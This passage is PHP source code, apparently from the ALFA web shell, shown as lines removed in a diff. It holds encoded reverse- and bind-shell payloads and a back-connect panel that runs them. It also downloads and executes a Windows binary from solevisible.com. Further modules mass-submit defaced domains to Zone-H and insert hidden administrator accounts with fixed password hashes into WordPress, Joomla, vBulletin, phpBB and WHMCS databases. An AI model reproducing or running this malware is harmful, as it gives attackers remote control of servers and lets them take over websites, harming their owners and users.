-$ruby="tVb7b9M6FP7Z+SuMN0hzVxLGQ+h2N6vGU0ggqjG4QmQXtc5pYy11gu3QoW387fiVrqXt1ivd66p1es7n8/T52p07SSNFMmI8Af4di2b0I9jBhVK17CXJhKmiGcW0miajR08fn7nPQMC3hgnAoazoGajwWlAPVcGHUwiDIIcxlg09kwESoBrB8fHHZ5+/Dt4enbx6f/wuzqsZp0MJ8XSoaNEJp3LG+KV5TxmfzMKor0QDvfGwlBAAz51FAcPSOOlIJSJtOdV7gNgYv2IlxHDOpJJ9r9TagY8n5jCz0rg1EKvqqw7NGDbHbaRYFcCxSEU8kc2ok2RJ0iVZRiJsYT4N4aLRh46OX3+KS+ATVaTpfoD1MqIvD07Tn8k/Xx7c//P0Yr/75Go36dfpG65gAqLjEVFPB6vsGZmePB98APEdhI2TkG4dWQ1NZTykFGoHpHEtGFeY2DZgWUBZ4h6mFedAFeQZJxY3ggnj9sksHSivlO8FXljjlJoqsCUhnAPF0voZdwic15VQ+OTl8bv0XIGYHgw+7Kdhtjv4+0V2GB54vRYe2DskC3yf4eyv7N7dHGeHdnvodtIdm1c09wamsYuu2/TmPSYxifbIIVlCzQrdaVzq2CeglhMySwyZBAxCVOKZqEzypWlGziAT/d1kBe+rU8a0qKZ1mhKyAvEwY4fmOP4jYWshZpVp6e+ORiasG4aRM7zxRHt1cz0/VFXiR79TRhvRzse8QLcgXzChvWvLNwHNZd6k264jCw31ZcpmvRvLtC5pV6etE7oN/p+mBRtNvXkf11UNvFN2iSDRxSWrLlvzrDJsk+8RPZd7K76ugm3D/l22+L19FiBpc33vNfnN6QW4bMR1BjKmZbWQkUw5K4PWluvhErE9tAS5gdi0o1VqO9DSIrXf9k81x5oC+oAc4TrGsz8ejvF2Loory3pIbsFxyBEcQkvUhhAaa760jIaMu/+byFCb2Tzo1QullS1hSUdYWoJuISkbP1rDTMjLF6nIytBm4kHtoTU0g9rDi4zihUvk4US2d3bdmLCty29MsDmKdpBX3S5r/o1z8Mh10ym3nM4lp353m/8zsHbgkJ82E6WbM/1kJwz58XKTZ8FG8gs=";
-$node="nVHLasMwEDwrkH8QvliCoEDTW8ih9BPSW/pAtdeRQJZcSXYKIfn2yrKd5tGWYh+Ed2d2NDtquMWu4juNV9jCRy0tkDQTUuVvlTUZOJdSFgnL6aQJZA3+nBrKlPaQ8xZ4eY52nRMhM9oZBRdXda1I6VUEKBUo6fxd6rkTaUBkQXo3rFLcF8aWrOQ+E2T+ugssSen3XFbmDD4hPSlyu20CMCi0ZafZ/jEFeuvFarWg++kEtXwRyGEvlgXzHtZgG7CkqHXmpdHERR5ybGelB5Ic8YMqOH5qV19HD8dnnbT74P7rtgqiMUcSjZ7jTjDnc6mZBVeXQOg1ZGrPws1Jzj1PZoMTTNqa7gcnsVoebpXB2pHjf40Npm+mUXcKpqTzoGPKm7uXtnmYTkA5wNfZ35+ydxfZPxqtoYu9V5nF19wsotx/HgH9lj76IXY0Mm80Mmg0LuHDFw==";
-$c="tVJtb9owEP7cSv0PHp1ap/WAsO0TTaWoZBLaChHJNE0bilLHNKcZG8Vmgk7rb98lBArZi/alUqzcPff47nzPnYLicpkJcmVsBrqdX58cn+5hBaj738BMwl0TXJuOXS+E+QNuNP8mbCOghAU8HVCNwFIBVqhAUJbMU1C0NNLinjOepwW5QPP7l6nz4+T4qIwYxpn23D662PCSI4IV0ywrElAEShxmtLzveb3q1hG0Dahkls5Brj3/XTIcBXH/KbDQhfVyq5WhqdVAq4Lu1HH2OGX+tql+FVXS4cgfDCaJP/q84Rlv83JaF2DR+OZ9EsWTwL9l3ZojbEnSC0sNxj8kJaeiJpPgYxSUGdmZZgYehJ5RvW1hRl8YR6zA0jrRHagMU9DGBMiFcwasu3JrmsThCoXEtxufeynnoqrefeoJU3HWeiS+nKUkFumcRLmQkjx+VS3We7MlZstFD4mHnnvg9eqUayw7py2xKkdL4mBy662sKOb9MHK985fhp8H1eb+OIoSm4KSDj+qYnLyCVt2t1EZQXjk/8QhpBNlp+/pZtC23tLI2zN60nveDKPQWYjh1iWPdMi7dy31kl/2fGzEMw8k4HifxTbgTmXKtlOD2r8rWe9GIOY5z1T1Yj0pT87+amobnHnjPoanZaorfLw==";
-$java="lVRNb9swDD2nQP+D4JM9BG6T04bCwz6ww4ABHZbeuhwUhbG12rIg0XGCNPvtoz7sumsvPdiWyCfy8ZGybHRrkP3he57LNn93c3khJyYF6G2XF7rb1FIwUXNrGa93/A54c7q8mGkj9xyBWeRIgJ1UvI4wjQwOCGpr2V1lgG8dfjzwXekOV0j2hkl7M3Xddvjkazv0DMgdOGhMn5+dvziQnbCSNpe2oMh+ScbCRTqHUJ9u92CM3MIk7r6VW2Y6lWae5wzNMSxmmyPC/ZptWMEU9Mxv3y8+LNc3wS8VMkFOyuPKTDdZdPSVrCEVH4vrjMVYM2KR90YipJv59VwMUG/f1Z2t0tH0asyz/4S34Ciq9NtBgEbZKgbZCXJSUZEWXDzcGS6Awnmwe4XqY72xY77shkuVkn5SlVQoN6UNIrjK3Dj43MHPRLMlXsnVRqorWyXeJXfp6mgRmrwE/GlaDQaPadLaXPEGkizH9kfbg/nKLRHKpdrC4XaXJr1USebkOcWo9EkC35itd9a/7DONHHMzx1YV1DX7+1uFzJPe9C75F9rbKOGqFQ+ArIp9C9voG7tL1F29eQ2qxKooFrH9M38NCppThBJMrrmxQBuPvr9eD/1YgaFZiqnskGpiTF2gAe242JwL17Gh0aGXUFtg/5NZvpVMEE1qwnrXYj1JPBFB6jmb8Dq/LgV7fGSv85newFK6siun/sQ8jvGzy1m2I3ZqH8HkH27HYKJxEuB+J3TwV6dQNuCOxyVNExxApDQ4WfxPkFo0tYtYMOmsX1CbOyJDAodePqFL90fRLxmO8EVOV8e49unluHyS0b/ecDPpOf8D";
-echo "<div class=header><center><br><div class='txtfont_header'>| Back Connect |</div><br><br>";
-echo "<form onSubmit=\"g('connect',null,this.selectCb.value,this.server.value,this.port.value,this.cbmethod.value);return false;\">
-<div class=\"txtfont\">Mehtod:</div> <select name='cbmethod' onChange='ctlbc(this);' style='width:120px;'><option value='back'>Reverse Shell</option><option value='bind'>Bind Port</option></select> <div class=\"txtfont\">Use:</div> <select name='selectCb'>";
-$cbArr = array("php"=>"Php","perl"=>"Perl","python"=>"Python","ruby"=>"Ruby","c"=>"C","java"=>"Java","node"=>"NodeJs","bcwin"=>"Windows");
-foreach($cbArr as $key=>$val){echo("<option value='{$key}' ".($GLOBALS['sys']=='win'?'selected':'').">{$val}</option>");}
-echo "</select> <div id='bcipAction' style='display:inline-block;'><div class=\"txtfont\">IP:</div> <input type='text' style='text-align:center;' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'></div> <div class=\"txtfont\">Port: </div> <input type='text' size='5' style='text-align:center;' name='port' value='2012'> <input type='submit' value=' '></form><p><div id='bcStatus'><small>Run ` <font color='red'>nc -l -v -p port</font> ` on your computer and press ` <font color='red'>>></font> ` button</small></div></p></center></b></font><br>";
-if(isset($_POST['alfa1'])&&!empty($_POST['alfa1'])){
-$lang = $_POST['alfa1'];
-$ip = $_POST['alfa2'];
-$port = $_POST['alfa3'];
-$arg = ($_POST['alfa4']=='bind'?$port:$port.' '.$ip);
-$tmpdir = ALFA_TEMPDIR;
-$name = $tmpdir.'/'.$lang.uniqid().rand(1,99999);
-$allow = array('perl','ruby','python','node');
-eval('$lan=$'.$lang.';');
-if(in_array($lang,$allow)){
-if(__write_file($name,__get_resource($lan))){
-if(_alfa_can_runCommand(true,true)){
-$os = ($GLOBALS['sys']!='win')?'1>/dev/null 2>&1 &':'';
-$out = alfaEx("$lang $name $arg $os");
-if($out==''){$out="<font color='green'><center>[ Finished...! ]</center></font>";}
-echo("<pre class='ml1' style='margin-top:5px'>{$out}</pre>");
-}
-}else{
-echo("<pre class=ml1 style='margin-top:5px'><font color='red'><center>[ Failed...! ]</center></font></pre>");
-}
-}
-if($lang=='java'||$lang=='c'){
-$code = __get_resource($lan);
-$out = nl2br(bcinit($lang, $code,'',''));
-echo("<pre class=ml1 style='margin-top:5px'><center>{$out}</center></pre>");
-}
-if($lang=='bcwin'){
-$alfa = new AlfaCURL();
-$s = $alfa->Send('http://solevisible.com/bc/windows.exe');
-$tmpdir = ALFA_TEMPDIR;
-$f = @fopen($tmpdir.'/bcwin.exe','w+');
-@fwrite($f, $s);
-@fclose($f);
-$out = alfaEx($tmpdir."/bcwin.exe ".$_POST['alfa2']." ".$_POST['alfa3']);
-}
-if($lang=='php'){
-echo "<pre class=ml1 style='margin-top:5px'>";
-$code = __get_resource($lan);
-if($code!==false){
-$code = "\$target = \"".$arg."\";\n".$code;
-eval($code);
-echo("<center><font color='green'>[ Finished...! ]</font></center>");
-}
-echo "</pre>";
-}
-}
-echo "</div>";
-alfafooter();
-}
-function alfazoneh(){
-alfahead();
-echo '<div class=header>';
-if(!function_exists('curl_version')){
-echo "<pre class=ml1 style='margin-top:5px'><center><font color=red><b><big><big>PHP CURL NOT EXIST ~ ZONE H MASS POSTER DOES NOT WORK</b></font></big></big></center></pre>";
-}
-$hackmode = array('known vulnerability (i.e. unpatched system)','undisclosed (new) vulnerability','configuration / admin. mistake','brute force attack','social engineering','Web Server intrusion','Web Server external module intrusion','Mail Server intrusion','FTP Server intrusion','SSH Server intrusion','Telnet Server intrusion','RPC Server intrusion','Shares misconfiguration','Other Server intrusion','SQL Injection','URL Poisoning','File Inclusion','Other Web Application bug','Remote administrative panel access bruteforcing','Remote administrative panel access password guessing','Remote administrative panel access social engineering','Attack against administrator(password stealing/sniffing)','Access credentials through Man In the Middle attack','Remote service password guessing','Remote service password bruteforce','Rerouting after attacking the Firewall','Rerouting after attacking the Router','DNS attack through social engineering','DNS attack through cache poisoning','Not available','Cross-Site Scripting');
-$reason = array('Heh...just for fun!','Revenge against that website','Political reasons','As a challenge','I just want to be the best defacer','Patriotism','Not available');
-echo '
-<center><br><div class="txtfont_header">| Zone-h Mass Poster |</div><center><br>
-<form action="" method="post" onsubmit="g(\'zoneh\',null,this.defacer.value,this.hackmode.value,this.reason.value,this.domain.value,\'>>\'); return false;">
-<input type="text" name="defacer" size="67" id="text" placeholder="ALFA TEaM 2012" />
-<br>
-<select id="text" name="hackmode" style="width:400px;">';
-$x=1;
-foreach($hackmode as $mode){echo('<option style="background-color: rgb(F, F, F);" value="'.$x.'">'.$mode.'</option>');$x++;}
-echo '</select><br><select id="text" name="reason" style="width:200px;">';
-$x=1;
-foreach($reason as $mode){echo('<option style="background-color: rgb(F, F, F);" value="'.$x.'">'.$mode.'</option>');$x++;}
-echo '</select><br>
-<textarea name="domain" cols="90" rows="20" placeholder="Domains..."></textarea><br>
-<p><input type="submit" value=" " name="go" /></p>
-</form></center>';
-if($_POST['alfa5'] && $_POST['alfa5'] == '>>'){
-ob_start();
-$hacker = $_POST['alfa1'];
-$method = $_POST['alfa2'];
-$neden = $_POST['alfa3'];
-$site = $_POST['alfa4'];
-if(empty($hacker)){
-die (__pre()."<center><b><font color =\"#FF0000\">[+] YOU MUST FILL THE ATTACKER NAME [+]</font></b></center>");
-}elseif($method == "------------------------------------SELECT-------------------------------------"){
-die(__pre()."<center><b><font color =\"#FF0000\">[+] YOU MUST SELECT THE METHOD [+]</b></font></center>");
-}elseif($neden == "------------------------------------SELECT-------------------------------------"){
-die(__pre()."<center><b><font color =\"#FF0000\">[+] YOU MUST SELECT THE REASON [+]</b></font></center>");
-}elseif(empty($site)){
-die(__pre()."<center><b><font color =\"#FF0000\">[+] YOU MUST INTER THE SITES LIST [+]<font></b></center>");
-}
-$i = 0;
-$sites = explode("\n", $site);
-$alfa = new AlfaCURL();
-while($i < count($sites)){
-if(substr($sites[$i], 0, 4) != "http"){
-$sites[$i] = "http://".$sites[$i];
-}
-$alfa->Send("http://www.zone-h.com/notify/single","post","defacer=".$hacker."&domain1=". $sites[$i]."&hackmode=".$method."&reason=".$neden);
-++$i;
-}
-echo __pre()."<center><font color =\"#00A220\"><b>[+] Sending Sites To Zone-H Has Been Completed Successfully !!![+]</b><font></center>";
-}
-echo "</div>";
-alfafooter();
-}
-function alfapwchanger(){
-alfahead();
-
-echo '<div class=header><center><br><div class="txtfont_header">| Add New Admin |</div>
-<center><h3>';
-$vals = array('WordPress' => array('wp',2),'Joomla' => array('joomla',3),'vBulletin' => array('vb',5),'phpBB' => array('phpbb',6),'WHMCS' => array('whmcs',7),'MyBB' => array('mybb',8),'Php Nuke' => array('nuke',9),'Drupal' => array('drupal',10),'SMF' => array('smf',11));
-Alfa_Create_A_Tag('pwchanger',$vals);
-echo '</h3></center>';
-if(isset($_POST['alfa1'])&&$_POST['alfa1']=='wp'){
-
-echo __pre().'<center><center><div class="txtfont_header">| WordPress |</div>
-<p>'.getConfigHtml('wp').'</p><form onSubmit="g(\'pwchanger\',null,\'wp\',\'>>\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,this.admin.value,this.email.value,this.prefix.value);return false;" method="POST">';
-$table = array('td1' =>
- array('color' => 'FFFFFF', 'tdName' => 'Mysql Host','id'=>'db_host', 'inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
- 'td2' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
- 'td3' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
- 'td4' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
- 'td5' =>
- array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => 'wp_', 'inputSize' => '50'),
- 'td6' =>
- array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
- 'td7' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
- 'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
-);
-create_table($table);
-echo '<p><input value=" " name="send" type="submit"></p></form>';
-if ($_POST['alfa2'] && $_POST['alfa2'] == '>>'){
-$localhost = $_POST['alfa3'];
-$database = $_POST['alfa4'];
-$username = $_POST['alfa5'];
-$password = $_POST['alfa6'];
-$admin = $_POST['alfa8'];
-$SQL = $_POST['alfa9'];
-$prefix = $_POST['alfa10'];
-$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
-$solevisible=@mysqli_query($conn,"insert into ".$prefix."users (ID,user_login,user_pass,user_email) values(null,'$admin','d4a590caacc0be55ef286e40a945ea45','$SQL')") or die(mysqli_error($conn));
-$solevisible=@mysqli_query($conn,"select ID from ".$prefix."users where user_login='".$admin."'") or die(mysqli_error($conn));
-$sole = @mysqli_num_rows($solevisible);
-if ($sole == 1){
-$solevis = @mysqli_fetch_assoc($solevisible);
-$res = $solevis['ID'];
-}
-$solevisible=@mysqli_query($conn,"insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','first_name','solevisible'),(null,'".$res."','last_name','solevisible'),(null,'".$res."','nickname','solevisible'),(null,'".$res."','description','solevisible'),(null,'".$res."','rich_editing','true'),(null,'".$res."','comment_shortcuts','false'),(null,'".$res."','admin_color','fresh'),(null,'".$res."','use_ssl','0'),(null,'".$res."','show_admin_bar_front','true'),(null,'".$res."','".$prefix."capabilities','a:1:{s:13:\"administrator\";b:1;}'),(null,'".$res."','".$prefix."user_level','10'),(null,'".$res."','show_welcome_panel','1'),(null,'".$res."','".$prefix."dashboard_quick_press_last_post_id','3')") or die(mysqli_error($conn));
-if($solevisible){
-__alert('Success... '.$admin.' is created...');}
-}
-}
-if($_POST['alfa2'] && $_POST['alfa2'] == 'joomla'){
-
-echo __pre().'<center><center><div class="txtfont_header">| Joomla |</div><p><p>'.getConfigHtml('joomla').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',\'joomla\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,this.admin.value,this.email.value,this.prefix.value);return false;" method="POST">';
-$table = array('td1' =>
- array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
- 'td2' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
- 'td3' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
- 'td4' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
- 'td5' =>
- array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => 'jos_', 'inputSize' => '50'),
- 'td6' =>
- array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
- 'td7' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
- 'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
-);
-create_table($table);
-echo '<p><input value=" " name="send" type="submit"></p></form></center>';
-if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
-$localhost = $_POST['alfa3'];
-$database = $_POST['alfa4'];
-$username = $_POST['alfa5'];
-$password = $_POST['alfa6'];
-$admin = $_POST['alfa8'];
-$SQL = $_POST['alfa9'];
-$prefix = $_POST['alfa10'];
-$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
-$solevisible=@mysqli_query($conn,"insert into ".$prefix."users (id,name,username,email,password) values(null,'Super User','".$admin."','".$SQL."','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($conn));
-$solevisible=@mysqli_query($conn,"select id from ".$prefix."users where username='".$admin."'") or die(mysqli_error($conn));
-$sole =@mysqli_num_rows($solevisible);
-if ($sole == 1){
-$solevis =@mysqli_fetch_assoc($solevisible);
-$res = $solevis['id'];
-}
-$solevisible=@mysqli_query($conn,"INSERT INTO ".$prefix."user_usergroup_map (user_id,group_id) VALUES ('".$res."', '8')") or die(mysqli_error($conn));
-if($solevisible){
-__alert('Success... '.$admin.' is created...');}
-}
-}
-if($_POST['alfa4'] && $_POST['alfa4'] == 'vb'){
-
-echo __pre().'<center><center><div class="txtfont_header">| vBulletin |<div><p>'.getConfigHtml('vb').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,\'vb\',this.username.value,this.password.value,this.prefix.value,this.admin.value,this.email.value); return false;" method="POST">';
-$table = array('td1' =>
- array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
- 'td2' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
- 'td3' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
- 'td4' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
- 'td5' =>
- array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => '', 'inputSize' => '50'),
- 'td6' =>
- array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
- 'td7' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
- 'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
-);
-create_table($table);
-echo '<p><input value=" " name="send" type="submit"></p></form></center>';
-if($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
-$localhost = $_POST['alfa2'];
-$database = $_POST['alfa3'];
-$username = $_POST['alfa5'];
-$password = $_POST['alfa6'];
-$prefix = $_POST['alfa7'];
-$admin = $_POST['alfa8'];
-$SQL = $_POST['alfa9'];
-$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_connect_error());
-$pw_col = @mysqli_connect("SELECT column_name FROM information_schema.columns where table_name = '{$prefix}user' and column_name = 'password' and table_schema = '{$database}'");
-$pw_col = @mysqli_num_rows($pw_col);
-$adm_perm = "16744444";
-if($pw_col > 0){
-$solevisible=@mysqli_query($conn,"insert into {$prefix}user (userid,usergroupid,username,password,salt,email,passworddate,joindate) values(null,'6','$admin','52e28b78f55641cd4618ad1a20f5fd5c','Xw|IbGLhTQA-AwApVv>61y^(z]*<QN','$SQL','".date('Y-m-d')."','".time()."')") or die(mysqli_error($conn));
-}else{
-$adm_perm = "2143256444";
-$solevisible=@mysqli_query($conn,"insert into {$prefix}user (userid,usergroupid,username,token,secret,email,passworddate,joindate,scheme,birthday_search) values(null,'6','$admin','\$2y\$10\$YsVhV.9tLnzBYxar1BJAGO3vFz68/qDU7Jt62SDdLy6lUT9N5Z/wq','Qf~ADeA}iAey-&#ALQF<}/uBDqSnw>','$SQL','".date('Y-m-d')."','".time()."','blowfish:10','1984-05-20')") or die(mysqli_error($conn));
-}
-$solevisible=@mysqli_query($conn,"select userid from {$prefix}user where username='".$admin."'") or die(mysqli_error($conn));
-$sole = mysqli_num_rows($solevisible);
-if($sole == 1){
-$solevis = mysqli_fetch_assoc($solevisible);
-$res = $solevis['userid'];
-}
-$solevisible=@mysqli_query($conn,"insert into {$prefix}administrator (userid,adminpermissions) values('".$res."','".$adm_perm."')") or die(mysqli_error($conn));
-if($solevisible){
-__alert('Success... '.$admin.' is created...');}
-}
-}
-if(isset($_POST['alfa5']) && $_POST['alfa5'] == 'phpbb'){
-
-echo __pre().'<center><div class="txtfont_header">| phpBB |</div><p><p>'.getConfigHtml('phpbb').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,this.username.value,\'phpbb\',this.password.value,null,this.admin.value,this.email.value,this.prefix.value); return false;" method="POST">';
-$table = array('td1' =>
- array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
- 'td2' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
- 'td3' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
- 'td4' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
- 'td5' =>
- array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => '', 'inputSize' => '50'),
- 'td6' =>
- array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
- 'td7' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
- 'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
-);
-create_table($table);
-echo '<p><input value=" " name="send" type="submit"></p></form></center>';
-if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
-$localhost = $_POST['alfa2'];
-$database = $_POST['alfa3'];
-$username = $_POST['alfa4'];
-$password = $_POST['alfa6'];
-$admin = $_POST['alfa8'];
-$SQL = $_POST['alfa9'];
-$prefix = $_POST['alfa10'];
-$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
-$hash = md5('solevisible');
-$solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
-$solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
-$solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE user_type = 3") or die(mysqli_error($conn));
-$solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE user_type = 3") or die(mysqli_error($conn));
-$solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_email ='".$SQL."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
-if($solevisible){
-__alert('Success... '.$admin.' is created...');
-}
-}
-}
-if(isset($_POST['alfa6']) && $_POST['alfa6'] == 'whmcs'){
-
-echo __pre().'<center><div class="txtfont_header">| Whmcs |</div><p><p>'.getConfigHtml('whmcs').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,this.username.value,this.password.value,\'whmcs\',null,this.admin.value,this.email.value); return false;" method="POST">';
-$table = array('td1' =>
- array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
- 'td2' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
- 'td3' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
- 'td4' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
- 'td6' =>
- array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
- 'td7' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
- 'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
-);
-create_table($table);
-echo '<p><input value=" " name="send" type="submit"></p></form></center>';
-if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
-$localhost = $_POST['alfa2'];
-$database = $_POST['alfa3'];
-$username = $_POST['alfa4'];
-$password = $_POST['alfa5'];
-$admin = $_POST['alfa8'];
-$SQL = $_POST['alfa9'];
-$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
-$solevisible=@mysqli_query($conn,"insert into tbladmins (id,roleid,username,password,email,template,homewidgets) values(null,'1','".$admin."','d4a590caacc0be55ef286e40a945ea45','".$SQL."','blend','getting_started:true,orders_overview:true,supporttickets_overview:true,my_notes:true,client_activity:true,open_invoices:true,activity_log:true|income_overview:true,system_overview:true,whmcs_news:true,sysinfo:true,admin_activity:true,todo_list:true,network_status:true,income_forecast:true|')") or die(mysqli_error($conn));
-if($solevisible){
-__alert('Success... '.$admin.' is created...');}
-}
-}
-if(isset($_POST['alfa7']) && $_POST['alfa7'] == 'mybb'){
-
-echo __pre().'<center><div class="txtfont_header">| Mybb |</div><p><p>'.getConfigHtml('mybb').'</p><form onsubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,\'mybb\',this.admin.value,this.email.value,this.prefix.value); return false;" method="POST">';
-$table = array('td1' =>
- array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
- 'td2' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
- 'td3' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
- 'td4' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
- 'td5' =>
- array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => '', 'inputSize' => '50'),
- 'td6' =>
- array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
- 'td7' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
- 'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
-);
-create_table($table);
-echo '<p><input value=" " name="send" type="submit"></p></form></center>';
-if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
